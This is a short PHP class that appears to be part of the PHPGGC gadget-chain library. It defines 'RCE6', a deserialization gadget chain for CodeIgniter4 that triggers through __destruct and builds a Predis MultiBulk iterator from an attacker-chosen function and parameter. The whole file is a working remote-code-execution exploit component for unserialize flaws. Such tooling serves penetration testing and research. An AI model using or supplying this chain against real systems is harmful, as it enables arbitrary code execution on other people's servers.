<?php

namespace GadgetChain\CodeIgniter4;

class RCE6 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '-4.1.3 <= 4.2.10+';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Predis\Response\Iterator\MultiBulk($function, $parameter);
    }
}
